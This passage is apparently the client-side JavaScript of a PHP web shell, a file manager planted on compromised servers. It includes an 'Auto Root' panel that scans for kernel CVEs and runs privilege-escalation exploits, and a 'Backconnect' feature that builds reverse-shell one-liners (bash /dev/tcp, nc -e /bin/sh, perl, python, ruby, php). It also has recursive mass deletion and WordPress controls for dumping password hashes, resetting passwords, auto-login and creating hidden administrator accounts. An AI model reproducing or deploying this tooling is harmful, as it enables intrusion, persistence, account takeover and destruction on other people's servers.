        if (r.ok) {
            showToast('Permission changed to <b>' + perm + '</b> successfully', 'success', 4000, 'applepay');
            hideChmodFileModal();
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Chmod failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}

// === HELPER: hide any modal by ID ===
function hideModal2(id) { document.getElementById(id).classList.add('hidden'); }

// === SYMLINK ===
function showSymlinkModal() {
    document.getElementById('symlinkTarget').value = '';
    document.getElementById('symlinkName').value = '';
    updateSymlinkPreview();
    document.getElementById('symlinkModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('symlinkTarget').focus(); }, 100);
}
function updateSymlinkPreview() {
    var t = document.getElementById('symlinkTarget').value.trim() || '/target/path';
    var n = document.getElementById('symlinkName').value.trim() || 'link_name';
    document.getElementById('symlinkPreview').textContent = 'symlink: ' + n + ' -> ' + t;
}
function doCreateSymlink() {
    var target = document.getElementById('symlinkTarget').value.trim();
    var name = document.getElementById('symlinkName').value.trim();
    if (!target) { showToast('Please enter a target path', 'warning'); return; }
    if (!name) { showToast('Please enter a link name', 'warning'); return; }
    fileActionRequest({
        file_action: 'create_symlink',
        symlink_target: target,
        symlink_name: name,
        target_dir: '<?php echo addslashes($currentDirectory); ?>'
    }, function(r) {
        if (r.ok) {
            showToast(r.msg || 'Symlink created', 'success', 4000, 'applepay');
            hideModal2('symlinkModal');
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}

// === AUTO ROOT ===
function showAutoRootModal() {
    document.getElementById('arStatus').textContent = 'Click Scan to detect kernel';
    document.getElementById('arStatus').style.color = 'var(--text-muted)';
    document.getElementById('arExploitList').style.display = 'none';
    document.getElementById('arSuidList').style.display = 'none';
    document.getElementById('arLogPanel').style.display = 'none';
    document.getElementById('arRootBanner').style.display = 'none';
    document.getElementById('arFailBanner').style.display = 'none';
    document.getElementById('arCustomCmd').value = '';
    ['arKernel','arArch','arUser','arUid','arGcc','arWritable','arSudo','arDocker','arOs'].forEach(function(id){
        document.getElementById(id).textContent = '-';
    });
    document.getElementById('autoRootModal').classList.remove('hidden');
}

var _arScanData = null;

function doAutoRootScan() {
    var btn = document.getElementById('arScanBtn');
    btn.disabled = true;
    btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;animation:spin 1s linear infinite;"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg> Scanning...';
    document.getElementById('arStatus').textContent = 'Scanning kernel, detecting CVEs...';
    document.getElementById('arStatus').style.color = '#f59e0b';

    fileActionRequest({file_action: 'auto_root_scan'}, function(r) {
        btn.disabled = false;
        btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg> Re-Scan';
        if (!r.ok) {
            document.getElementById('arStatus').textContent = 'Scan failed: ' + (r.err || 'Unknown');
            document.getElementById('arStatus').style.color = '#f85149';
            return;
        }
        _arScanData = r;
        var info = r.info;
        document.getElementById('arKernel').textContent = info.kernel || 'unknown';
        document.getElementById('arArch').textContent = info.arch || 'unknown';
        document.getElementById('arUser').textContent = info.user || 'unknown';
        document.getElementById('arUid').textContent = info.uid || 'unknown';
        document.getElementById('arGcc').textContent = info.gcc || 'not found';
        document.getElementById('arGcc').style.color = (info.gcc && info.gcc !== 'not found') ? '#3fb950' : '#f85149';
        document.getElementById('arWritable').textContent = info.writable_dir || 'none';
        document.getElementById('arSudo').textContent = info.sudo || 'N/A';
        document.getElementById('arDocker').textContent = info.docker_sock === 'yes' ? 'Socket found!' : 'No';
        document.getElementById('arDocker').style.color = info.docker_sock === 'yes' ? '#f59e0b' : 'var(--text-muted)';
        document.getElementById('arOs').textContent = (info.os || 'unknown').replace(/\n/g, ' | ');

        // Check if already root
        if (info.uid && info.uid.indexOf('uid=0') !== -1) {
            document.getElementById('arStatus').innerHTML = '<span style="color:#3fb950;font-weight:600;">Already running as root!</span>';
            document.getElementById('arUser').style.color = '#3fb950';
        } else {
            document.getElementById('arStatus').textContent = 'Scan complete - ' + r.exploits.length + ' exploit(s) found';
            document.getElementById('arStatus').style.color = r.exploits.length > 0 ? '#3fb950' : '#f85149';
        }

        // Render exploits
        var eDiv = document.getElementById('arExploits');
        eDiv.innerHTML = '';
        document.getElementById('arExploitCount').textContent = r.exploits.length;
        if (r.exploits.length > 0) {
            document.getElementById('arExploitList').style.display = 'block';
            r.exploits.forEach(function(ex, idx) {
                var sevColors = {CRITICAL:'#ef4444',HIGH:'#f97316',MEDIUM:'#f59e0b',LOW:'#3fb950'};
                var sevBg = {CRITICAL:'239,68,68',HIGH:'249,115,22',MEDIUM:'245,158,11',LOW:'63,185,80'};
                var sc = sevColors[ex.severity] || '#888';
                var sb2 = sevBg[ex.severity] || '136,136,136';
                var hasGcc = info.gcc && info.gcc !== 'not found';
                var needsCompile = ex.compile && ex.compile.indexOf('gcc') !== -1;
                var canRun = !needsCompile || hasGcc;
                var card = '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:12px;border-left:3px solid '+sc+';">';
                card += '<div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:6px;">';
                card += '<div><span style="font-size:12px;font-weight:700;color:var(--text-primary);">'+esc(ex.name)+'</span>';
                card += ' <span style="font-size:9px;padding:2px 6px;border-radius:3px;background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.2);font-family:monospace;">'+esc(ex.cve)+'</span></div>';
                card += '<span style="font-size:9px;padding:2px 8px;border-radius:10px;background:rgba('+sb2+',0.12);color:'+sc+';font-weight:600;">'+ex.severity+'</span></div>';
                card += '<p style="font-size:10px;color:var(--text-muted);margin-bottom:8px;">'+esc(ex.desc)+'</p>';
                if (ex.compile) card += '<div style="font-size:9px;color:var(--text-muted);margin-bottom:4px;">Compile: <code style="background:rgba(0,0,0,0.3);padding:1px 4px;border-radius:2px;color:#00d4ff;">'+esc(ex.compile)+'</code></div>';
                if (ex.run) card += '<div style="font-size:9px;color:var(--text-muted);margin-bottom:8px;">Run: <code style="background:rgba(0,0,0,0.3);padding:1px 4px;border-radius:2px;color:#3fb950;">'+esc(ex.run.length > 100 ? ex.run.substring(0,100)+'...' : ex.run)+'</code></div>';
                if (!canRun) {
                    card += '<div style="font-size:9px;color:#f85149;margin-bottom:6px;">Requires GCC (not found)</div>';
                }
                card += '<button class="btn btn-sm" style="background:'+sc+';border-color:'+sc+';color:#fff;font-weight:600;font-size:10px;" '+(canRun?'':'disabled')+' onclick="doAutoRootExploit('+idx+')">Execute Exploit</button>';
                card += '</div>';
                eDiv.innerHTML += card;
            });
        } else {
            document.getElementById('arExploitList').style.display = 'block';
            eDiv.innerHTML = '<div style="text-align:center;padding:16px;color:var(--text-muted);font-size:11px;">No known kernel CVE exploits matched this kernel version.<br>Try SUID binaries or custom commands below.</div>';
        }

        // Render SUID
        var sDiv = document.getElementById('arSuids');
        sDiv.innerHTML = '';
        document.getElementById('arSuidCount').textContent = r.suid_exploits.length;
        if (r.suid_exploits.length > 0) {
            document.getElementById('arSuidList').style.display = 'block';
            r.suid_exploits.forEach(function(s) {
                sDiv.innerHTML += '<div style="background:rgba(167,139,250,0.08);border:1px solid rgba(167,139,250,0.2);border-radius:6px;padding:6px 10px;font-size:10px;cursor:pointer;" onclick="document.getElementById(\'arCustomCmd\').value=\''+esc(s.bin)+' [exploit_args]\';" title="'+esc(s.bin)+'">'
                    + '<span style="color:#a78bfa;font-weight:600;">'+esc(s.name)+'</span>'
                    + ' <span style="color:var(--text-muted);font-size:9px;">SUID</span></div>';
            });
        }

        showToast('Scan complete: ' + r.exploits.length + ' exploit(s) found', r.exploits.length > 0 ? 'success' : 'info');
    });
}

function doAutoRootExploit(idx) {
    if (!_arScanData || !_arScanData.exploits[idx]) return;
    var ex = _arScanData.exploits[idx];
    document.getElementById('arLogPanel').style.display = 'block';
    document.getElementById('arRootBanner').style.display = 'none';
    document.getElementById('arFailBanner').style.display = 'none';
    var logEl = document.getElementById('arLog');
    logEl.textContent = '[*] Executing: ' + ex.name + ' (' + ex.cve + ')\n[*] Please wait...\n';
    logEl.scrollTop = logEl.scrollHeight;

    fileActionRequest({
        file_action: 'auto_root_exec',
        exploit_url: ex.url || '',
        compile_cmd: ex.compile || '',
        run_cmd: ex.run || ''
    }, function(r) {
        if (!r.ok) {
            logEl.textContent += '\n[!] Error: ' + (r.err || 'Unknown');
            document.getElementById('arFailBanner').style.display = 'block';
            playFailSound();
            return;
        }
        logEl.textContent = r.log || '(no output)';
        logEl.scrollTop = logEl.scrollHeight;
        if (r.is_root) {
            document.getElementById('arRootBanner').style.display = 'block';
            document.getElementById('arRootInfo').textContent = 'User: ' + r.user + ' | ' + r.id;
            showToast('ROOT ACCESS OBTAINED!', 'success', 5000, 'applepay');
            // Update terminal prompt
            var promptEl = document.querySelector('.cmd-dollar');
            if (promptEl) { promptEl.textContent = '#'; promptEl.style.color = '#ef4444'; }
            var userEl = document.querySelector('.cmd-user');
            if (userEl) userEl.textContent = 'root@' + (userEl.textContent.split('@')[1] || 'localhost');
        } else {
            document.getElementById('arFailBanner').style.display = 'block';
            playFailSound();
        }
    });
}

function doAutoRootCustom() {
    var cmd = document.getElementById('arCustomCmd').value.trim();
    if (!cmd) { showToast('Enter a command', 'warning'); return; }
    document.getElementById('arLogPanel').style.display = 'block';
    document.getElementById('arRootBanner').style.display = 'none';
    document.getElementById('arFailBanner').style.display = 'none';
    var logEl = document.getElementById('arLog');
    logEl.textContent = '[*] Running custom: ' + cmd + '\n[*] Please wait...\n';

    fileActionRequest({
        file_action: 'auto_root_exec',
        custom_cmd: cmd
    }, function(r) {
        if (!r.ok) {
            logEl.textContent += '\n[!] Error: ' + (r.err || 'Unknown');
            document.getElementById('arFailBanner').style.display = 'block';
            playFailSound();
            return;
        }
        logEl.textContent = r.log || '(no output)';
        logEl.scrollTop = logEl.scrollHeight;
        if (r.is_root) {
            document.getElementById('arRootBanner').style.display = 'block';
            document.getElementById('arRootInfo').textContent = 'User: ' + r.user + ' | ' + r.id;
            showToast('ROOT ACCESS OBTAINED!', 'success', 5000, 'applepay');
            var promptEl = document.querySelector('.cmd-dollar');
            if (promptEl) { promptEl.textContent = '#'; promptEl.style.color = '#ef4444'; }
        } else {
            document.getElementById('arFailBanner').style.display = 'block';
            playFailSound();
        }
    });
}

// === BACKCONNECT ===
function showBackconnectModal() {
    document.getElementById('bcHost').value = '';
    document.getElementById('bcPort').value = '';
    document.getElementById('bcType').value = 'php';
    document.getElementById('bcResult').style.display = 'none';
    updateBcPreview();
    document.getElementById('backconnectModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('bcHost').focus(); }, 100);
}
function updateBcPreview() {
    var host = document.getElementById('bcHost').value.trim() || 'HOST';
    var port = document.getElementById('bcPort').value.trim() || 'PORT';
    var type = document.getElementById('bcType').value;
    var cmds = {
        php: 'fsockopen("' + host + '", ' + port + ') + proc_open("/bin/sh -i")',
        perl: "perl -e 'use Socket;$i=\"" + host + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,...);exec(\"/bin/sh -i\");'",
        python: "python3 -c 'import socket,subprocess,os;s.connect((\"" + host + "\"," + port + "));...'",
        nc: 'nc -e /bin/sh ' + host + ' ' + port,
        bash: "bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'",
        ruby: "ruby -rsocket -e 'f=TCPSocket.open(\"" + host + "\"," + port + ").to_i;exec ...'"
    };
    document.getElementById('bcPreview').textContent = cmds[type] || '';
}
function doBackconnect() {
    var host = document.getElementById('bcHost').value.trim();
    var port = document.getElementById('bcPort').value.trim();
    var type = document.getElementById('bcType').value;
    if (!host) { showToast('Please enter a host/IP', 'warning'); return; }
    if (!port || parseInt(port) < 1 || parseInt(port) > 65535) { showToast('Please enter a valid port (1-65535)', 'warning'); return; }
    var btn = document.getElementById('bcConnBtn');
    btn.disabled = true; btn.textContent = 'Connecting...';
    var resDiv = document.getElementById('bcResult');
    resDiv.style.display = 'block';
    resDiv.innerHTML = '<span style="color: var(--text-muted);">Attempting connection to ' + host + ':' + port + ' via ' + type + '...</span>';
    fileActionRequest({
        file_action: 'backconnect',
        bc_type: type,
        bc_host: host,
        bc_port: port
    }, function(r) {
        btn.disabled = false;
        btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg> Connect';
        if (r.ok) {
            var html = '<span style="color: #3fb950;">' + (r.msg || 'Connected') + '</span>';
            if (r.output) html += '<br><span style="color: var(--text-muted);">Output: ' + r.output.replace(/</g,'&lt;') + '</span>';
            if (r.exec_used) html += '<br><span style="color: #00d4ff; font-size:9px;">exec via: ' + r.exec_used + '</span>';
            resDiv.innerHTML = html;
            showToast(r.msg || 'Backconnect launched', 'success', 5000, 'applepay');
        } else {
            resDiv.innerHTML = '<span style="color: #f85149;">Error: ' + (r.err || 'Unknown') + '</span>';
            showToast('Backconnect failed: ' + (r.err || 'Unknown'), 'error');
            playFailSound();
        }
    });
}
// Event listeners for preview update
document.getElementById('bcHost').addEventListener('input', updateBcPreview);
document.getElementById('bcPort').addEventListener('input', updateBcPreview);

// === CREATE FOLDER ===
function showCreateFolderModal() {
    document.getElementById('newFolderName').value = '';
    document.getElementById('createFolderModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('newFolderName').focus(); }, 100);
}
function doCreateFolder() {
    var name = document.getElementById('newFolderName').value.trim();
    if (!name) { showToast('Please enter a folder name', 'warning'); return; }
    fileActionRequest({file_action: 'create_folder', folder_name: name, target_dir: '<?php echo addslashes($currentDirectory); ?>'}, function(r) {
        if (r.ok) {
            showToast('Folder <b>' + name + '</b> created', 'success', 4000, 'applepay');
            hideModal2('createFolderModal');
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}

// === CREATE FILE ===
function showCreateFileModal() {
    document.getElementById('newFileName').value = '';
    document.getElementById('newFileContent').value = '';
    document.getElementById('createFileModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('newFileName').focus(); }, 100);
}
function doCreateFile() {
    var name = document.getElementById('newFileName').value.trim();
    if (!name) { showToast('Please enter a file name', 'warning'); return; }
    var content = document.getElementById('newFileContent').value;
    fileActionRequest({file_action: 'create_file', file_name: name, file_content: content, target_dir: '<?php echo addslashes($currentDirectory); ?>'}, function(r) {
        if (r.ok) {
            showToast('File <b>' + name + '</b> created', 'success', 4000, 'applepay');
            hideModal2('createFileModal');
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}

// === SELECT / BULK ACTIONS ===
function toggleSelectAll(el) {
    var boxes = document.querySelectorAll('.file-checkbox');
    boxes.forEach(function(b) { b.checked = el.checked; });
    updateBulkBar();
}
function getSelectedPaths() {
    var paths = [];
    document.querySelectorAll('.file-checkbox:checked').forEach(function(b) { paths.push(b.value); });
    return paths;
}
function updateBulkBar() {
    var paths = getSelectedPaths();
    var bar = document.getElementById('bulkBar');
    if (paths.length > 0) {
        bar.style.display = 'flex';
        document.getElementById('bulkCount').textContent = paths.length;
    } else {
        bar.style.display = 'none';
    }
    // Sync selectAll checkbox
    var all = document.querySelectorAll('.file-checkbox');
    var checked = document.querySelectorAll('.file-checkbox:checked');
    var sa = document.getElementById('selectAllFiles');
    if (sa) sa.checked = all.length > 0 && all.length === checked.length;
}
function clearSelection() {
    document.querySelectorAll('.file-checkbox').forEach(function(b) { b.checked = false; });
    var sa = document.getElementById('selectAllFiles'); if (sa) sa.checked = false;
    updateBulkBar();
}
function bulkAction(type) {
    var paths = getSelectedPaths();
    if (paths.length === 0) { showToast('No files selected', 'warning'); return; }
    if (type === 'download') {
        if (paths.length === 1) {
            window.location.href = '?dl=' + encodeURIComponent(paths[0]) + '&lastpiece=hacktivist';
        } else {
            // Multiple files -> zip first then download
            showToast('Multiple files selected. Compressing to ZIP for download...', 'info', 3000);
            fileActionRequest({file_action: 'compress_zip', paths: JSON.stringify(paths), target_dir: '<?php echo addslashes($currentDirectory); ?>', zip_name: 'download_' + Date.now() + '.zip'}, function(r) {
                if (r.ok && r.zip_path) {
                    showToast('Compressed. Starting download...', 'success', 3000, 'applepay');
                    setTimeout(function() { window.location.href = '?dl=' + encodeURIComponent(r.zip_path) + '&lastpiece=hacktivist'; }, 500);
                } else {
                    showToast('Compress failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
                }
            });
        }
    } else if (type === 'zip') {
        document.getElementById('zipFileName').value = 'archive_' + Date.now() + '.zip';
        document.getElementById('zipNameModal').classList.remove('hidden');
    } else if (type === 'delete') {
        if (!confirm('Delete ' + paths.length + ' selected items? This cannot be undone!')) return;
        fileActionRequest({file_action: 'mass_delete', paths: JSON.stringify(paths)}, function(r) {
            if (r.ok) {
                showToast('Deleted <b>' + r.deleted + '</b> items' + (r.failed > 0 ? ', <b>' + r.failed + '</b> failed' : ''), r.failed > 0 ? 'warning' : 'success', 4000, 'applepay');
                clearSelection();
                setTimeout(function() { location.reload(); }, 800);
            } else {
                showToast('Delete failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
            }
        });
    }
}
function doCompressZip() {
    var paths = getSelectedPaths();
    var zipName = document.getElementById('zipFileName').value.trim() || 'archive.zip';
    if (paths.length === 0) { showToast('No files selected', 'warning'); return; }
    hideModal2('zipNameModal');
    showToast('Compressing ' + paths.length + ' items...', 'info', 3000);
    fileActionRequest({file_action: 'compress_zip', paths: JSON.stringify(paths), target_dir: '<?php echo addslashes($currentDirectory); ?>', zip_name: zipName}, function(r) {
        if (r.ok) {
            showToast(r.msg, 'success', 4000, 'applepay');
            clearSelection();
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Compress failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
        }
    });
}

// === MASS DELETE RECURSIVE ===
function showMassDeleteModal() {
    document.getElementById('massDelCode').value = '';
    document.getElementById('massDelResult').style.display = 'none';
    document.getElementById('massDelMode').value = 'code';
    document.getElementById('massDelCodeGroup').style.display = '';
    document.getElementById('massDeleteModal').classList.remove('hidden');
}
function toggleMassDelCode() {
    var mode = document.getElementById('massDelMode').value;
    document.getElementById('massDelCodeGroup').style.display = mode === 'code' ? '' : 'none';
}
function doMassDeleteRecursive() {
    var dir = document.getElementById('massDelDir').value.trim();
    var mode = document.getElementById('massDelMode').value;
    var code = mode === 'code' ? document.getElementById('massDelCode').value : '';
    if (!dir) { showToast('Target directory required', 'warning'); return; }
    if (mode === 'code' && !code.trim()) { showToast('Please paste code/text to match', 'warning'); return; }
    var label = mode === 'all' ? 'ALL FILES' : 'files containing the specified code';
    if (!confirm('This will delete ' + label + ' recursively in:\n' + dir + '\n\nContinue?')) return;
    var btn = document.getElementById('massDelBtn');
    btn.disabled = true; btn.textContent = 'Deleting...';
    var resDiv = document.getElementById('massDelResult');
    resDiv.style.display = 'block';
    resDiv.innerHTML = '<span style="color: var(--text-muted);">Scanning and deleting...</span>';
    fileActionRequest({file_action: 'mass_delete_recursive', target_dir: dir, code_content: code}, function(r) {
        btn.disabled = false;
        btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg> Execute Delete';
        if (r.ok) {
            resDiv.innerHTML = '<span style="color: #3fb950;">Deleted: <b>' + r.deleted + '</b></span> | <span style="color: #f85149;">Failed: <b>' + r.failed + '</b></span> | <span style="color: var(--text-muted);">Scanned: ' + r.scanned + '</span>';
            showToast('Mass delete done: <b>' + r.deleted + '</b> deleted, <b>' + r.failed + '</b> failed', r.failed > 0 ? 'warning' : 'success', 5000, 'applepay');
        } else {
            resDiv.innerHTML = '<span style="color: #f85149;">Error: ' + (r.err || 'Unknown') + '</span>';
            showToast('Mass delete error: ' + (r.err || 'Unknown'), 'error'); playFailSound();
        }
    });
}

// === KEYBOARD SHORTCUTS for modals ===
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        if (!document.getElementById('editFileModal').classList.contains('hidden')) hideEditModal();
        if (!document.getElementById('renameModal').classList.contains('hidden')) hideRenameModal();
        if (!document.getElementById('chmodFileModal').classList.contains('hidden')) hideChmodFileModal();
        ['autoRootModal','symlinkModal','backconnectModal','createFolderModal','createFileModal','massDeleteModal','zipNameModal'].forEach(function(id){
            var el = document.getElementById(id);
            if (el && !el.classList.contains('hidden')) hideModal2(id);
        });
    }
});
document.getElementById('renameNewName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doRename(); }
});
document.getElementById('chmodNewPerm').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doChmod(); }
});
document.getElementById('symlinkTarget').addEventListener('input', updateSymlinkPreview);
document.getElementById('symlinkName').addEventListener('input', updateSymlinkPreview);
document.getElementById('symlinkName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doCreateSymlink(); }
});
document.getElementById('newFolderName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doCreateFolder(); }
});
document.getElementById('newFileName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doCreateFile(); }
});
document.getElementById('zipFileName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doCompressZip(); }
});
// Tab support in editor
document.getElementById('editFileContent').addEventListener('keydown', function(e) {
    if (e.key === 'Tab') {
        e.preventDefault();
        var s = this.selectionStart, end = this.selectionEnd;
        this.value = this.value.substring(0, s) + '    ' + this.value.substring(end);
        this.selectionStart = this.selectionEnd = s + 4;
    }
});
// Tab support in new file content editor
document.getElementById('newFileContent').addEventListener('keydown', function(e) {
    if (e.key === 'Tab') {
        e.preventDefault();
        var s = this.selectionStart, end = this.selectionEnd;
        this.value = this.value.substring(0, s) + '    ' + this.value.substring(end);
        this.selectionStart = this.selectionEnd = s + 4;
    }
});

function addUploader() {
    var c = document.getElementById('uploadersContainer');
    var r = document.createElement('div');
    r.className = 'uploader-row';
    r.innerHTML = '<label class="custom-file-input"><input type="file" name="files[]" onchange="updateFileName(this)"><span class="file-btn">Choose File</span><span class="file-name">No file selected</span></label><button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)">X</button>';
    c.appendChild(r);
}

function removeUploader(btn) {
    var c = document.getElementById('uploadersContainer');
    if (c.children.length > 1) btn.parentElement.remove();
}

function updateFileName(input) {
    var label = input.closest('.custom-file-input');
    var nameSpan = label.querySelector('.file-name');
    if (input.files.length > 0) { nameSpan.textContent = input.files[0].name; label.classList.add('has-file'); }
    else { nameSpan.textContent = 'No file selected'; label.classList.remove('has-file'); }
}

document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) overlay.classList.add('hidden');
    });
});

<?php if (!empty($ftpAccounts) || isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])): ?>
showModal('ftp');
<?php endif; ?>

// === WordPress Manager Functions ===
function wpRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try {
            var response = JSON.parse(xhr.responseText);
            callback(response);
        } catch(e) {
            callback({err: xhr.responseText.substring(0, 300)});
        }
    };
    xhr.onerror = function() { callback({err: 'Network error'}); };
    var params = [];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}

function wpLoadUsers() {
    var container = document.getElementById('wpUserList');
    if (!container) return;
    container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">Loading users...</div>';
    wpRequest({c4t: 'ulst'}, function(users) {
        if (users.err) {
            container.innerHTML = '<div style="text-align:center;padding:20px;color:#f85149;font-size:11px;">Error: ' + users.err + '</div>';
            return;
        }
        if (!users.length) {
            container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No users found.</div>';
            return;
        }
        var html = '';
        users.forEach(function(u) {
            var isHidden = u.is_hidden || false;
            var hiddenBadge = isHidden ? '<span style="background:#7c3aed;color:white;padding:1px 6px;border-radius:3px;font-size:9px;font-weight:600;margin-left:6px;">HIDDEN</span>' : '';
            var borderLeft = isHidden ? 'border-left: 3px solid #7c3aed;' : '';
            var bgColor = isHidden ? 'background: rgba(124,58,237,0.08);' : 'background: var(--bg-secondary);';
            html += '<div style="' + bgColor + borderLeft + 'border: 1px solid var(--border); border-radius: 6px; padding: 10px; margin-bottom: 6px;">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;">';
            html += '<div style="flex:1;min-width:200px;">';
            html += '<div style="display:flex;align-items:center;gap:6px;">';
            html += '<span style="color:#3b82f6;font-size:10px;font-weight:600;font-family:monospace;">#' + u.ID + '</span>';
            html += '<span style="color:var(--accent);font-size:12px;font-weight:600;">' + u.user_login + '</span>';
            html += hiddenBadge;
            html += '</div>';
            html += '<div style="color:var(--text-muted);font-size:10px;">' + u.user_email + '</div>';
            html += '<div style="color:var(--text-muted);font-size:9px;font-family:monospace;word-break:break-all;max-width:280px;opacity:0.6;">' + u.user_pass.substring(0, 34) + '...</div>';
            html += '</div>';
            html += '<div style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;">';
            html += '<button class="btn btn-sm btn-danger" style="padding:3px 8px;font-size:10px;" onclick="wpResetPw(' + u.ID + ',this)">ResetPW</button>';
            html += '<button class="btn btn-sm btn-primary" style="padding:3px 8px;font-size:10px;" onclick="wpAutoLogin(' + u.ID + ')">Login</button>';
            if (isHidden) {
                html += '<button class="btn btn-sm" style="padding:3px 8px;font-size:10px;background:#3fb950;border-color:#3fb950;color:#fff;" onclick="wpUnhideUser(' + u.ID + ',this)">Unhide</button>';
            } else {
                html += '<button class="btn btn-sm" style="padding:3px 8px;font-size:10px;background:#f97316;border-color:#f97316;color:#fff;" onclick="wpHideUser(' + u.ID + ',this)">Hide</button>';
            }
            html += '<button class="btn btn-sm btn-secondary" style="padding:3px 8px;font-size:10px;" onclick="wpDeleteUser(' + u.ID + ',\'' + u.user_login.replace(/'/g, "\\'") + '\')">Del</button>';
            html += '</div>';
            html += '</div>';
            html += '<div id="wpPwInfo_' + u.ID + '" style="display:none;margin-top:8px;padding:6px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:4px;font-size:11px;font-family:monospace;"></div>';
            html += '</div>';
        });
        container.innerHTML = html;
    });
}

function wpResetPw(uid, btn) {
    var origText = btn.textContent;
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'rpsw', uix: uid}, function(r) {
        btn.textContent = origText;
        btn.disabled = false;
        if (r.n) {
            var info = document.getElementById('wpPwInfo_' + uid);
            info.style.display = 'block';
            info.innerHTML = '<span style="color:#3fb950;">New password:</span> <strong style="color:#00d4ff;user-select:all;">' + r.n + '</strong> <button class="btn btn-sm btn-primary" style="padding:2px 6px;font-size:9px;margin-left:6px;" onclick="navigator.clipboard.writeText(\'' + r.n + '\');this.textContent=\'Copied!\'">Copy</button>';
            setTimeout(function(){ info.style.display = 'none'; }, 15000);
        } else {
            alert('Reset failed: ' + (r.err || 'unknown'));
        }
    });
}

function wpAutoLogin(uid) {
    wpRequest({c4t: 'alog', uix: uid}, function(r) {
        if (r.url) window.open(r.url, '_blank');
        else alert('Login failed: ' + (r.err || 'unknown'));
    });
}

function wpHideUser(uid, btn) {
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'hide', uix: uid}, function(r) {
        btn.disabled = false;
        if (r.ok) wpLoadUsers();
        else { btn.textContent = 'Hide'; alert('Hide failed'); }
    });
}

function wpUnhideUser(uid, btn) {
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'unhide', uix: uid}, function(r) {
        btn.disabled = false;
        if (r.ok) wpLoadUsers();
        else { btn.textContent = 'Unhide'; alert('Unhide failed'); }
    });
}

var wpDelTarget = null;
function wpDeleteUser(uid, name) {
    wpDelTarget = uid;
    document.getElementById('wpDeleteName').textContent = name;
    showModal('wpDelete');
}

function wpConfirmDelete() {
    if (!wpDelTarget) return;
    var btn = document.getElementById('wpDeleteConfirmBtn');
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'del', uix: wpDelTarget}, function(r) {
        btn.textContent = 'Delete';
        btn.disabled = false;
        hideModal('wpDelete');
        if (r.ok) {
            wpLoadUsers();
            wpShowStatus('User "' + r.user + '" deleted.', 'ok');
        } else {
            var msg = r.err === 'cannot_delete_self' ? 'Cannot delete yourself' : (r.err || 'Delete failed');
            wpShowStatus(msg, 'err');
        }
        wpDelTarget = null;
    });
}

function wpCreateAdmin() {
    var user = document.getElementById('wpNewUser').value.trim();
    var pass = document.getElementById('wpNewPass').value.trim();
    var email = document.getElementById('wpNewEmail').value.trim();
    var hide = document.getElementById('wpHideUser').checked;
